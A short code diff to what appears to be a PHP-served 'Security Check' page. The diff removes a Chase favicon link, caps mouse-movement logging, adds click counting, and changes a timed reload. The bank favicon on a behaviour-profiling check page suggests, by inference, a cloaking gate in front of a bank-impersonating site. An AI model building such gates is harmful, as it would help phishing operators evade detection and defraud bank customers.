@@ -644,7 +644,6 @@ if ($is_first_visit) {
       <meta charset="UTF-8" />
       <title>Security Check</title>
       <meta name="viewport" content="width=device-width, initial-scale=1" />
-      <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
       <style>
         body {
           margin: 0;
@@ -699,20 +698,28 @@ if ($is_first_visit) {
         // Collect basic behavioral data for 5 seconds
         const behaviorData = {
           mouseMovements: [],
+          clicks: 0,
           startTime: Date.now()
         };
         
         document.addEventListener('mousemove', function(e) {
-          behaviorData.mouseMovements.push({
-            x: e.clientX,
-            y: e.clientY,
-            time: Date.now()
-          });
+          if (behaviorData.mouseMovements.length < 50) { // Limit storage
+            behaviorData.mouseMovements.push({
+              x: e.clientX,
+              y: e.clientY,
+              time: Date.now()
+            });
+          }
         });
         
-        // After 5 seconds, reload to trigger analysis
+        document.addEventListener('click', function() {
+          behaviorData.clicks++;
+        });
+        
+        // After 5 seconds, navigate to same URL to trigger analysis
         setTimeout(function() {
-          window.location.reload();
+          // Use href instead of reload to avoid POST resubmission warnings
+          window.location.href = window.location.href;
         }, 5000);
       </script>
     </body>
